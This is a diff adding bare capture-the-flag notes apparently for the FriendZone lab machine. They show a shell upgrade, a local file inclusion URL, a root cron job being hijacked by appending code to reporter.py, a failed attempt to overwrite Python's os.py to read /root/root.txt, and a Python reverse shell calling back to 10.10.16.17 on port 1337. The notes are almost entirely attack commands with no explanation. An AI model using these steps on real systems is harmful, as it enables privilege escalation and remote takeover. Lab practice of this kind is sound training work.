@@ -1,0 +1,27 @@
+python3 -c "import pty; pty.spawn('/bin/sh');"
+
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/hello
+
+
+2019/06/09 18:30:01 CMD: UID=0    PID=1383   | /bin/sh -c /opt/server_admin/reporter.py 
+2019/06/09 18:30:01 CMD: UID=0    PID=1382   | /bin/sh -c /opt/server_admin/reporter.py 
+
+
+echo "import os; os.system('cat /root/root.txt');" >> /opt/server_admin/reporter.py
+
+
+
+riend@FriendZone:~$ echo 'f=open("/root/root.txt","r");g=("/home/friend/root.txt","w");g.write(f.read());g.close();f.close()' > /usr/lib/python2.7/os.py
+friend@FriendZone:~$ python /opt/server_admin/reporter.py
+Traceback (most recent call last):
+  File "/usr/lib/python2.7/site.py", line 68, in <module>
+    import os
+  File "/usr/lib/python2.7/os.py", line 1, in <module>
+    f=open("/root/root.txt","r");g=("/home/friend/root.txt","w");g.write(f.read());g.close();f.close()
+IOError: [Errno 13] Permission denied: '/root/root.txt'
+friend@FriendZone:~$ 
+
+
+
+
+echo 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.17",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' >> test.py
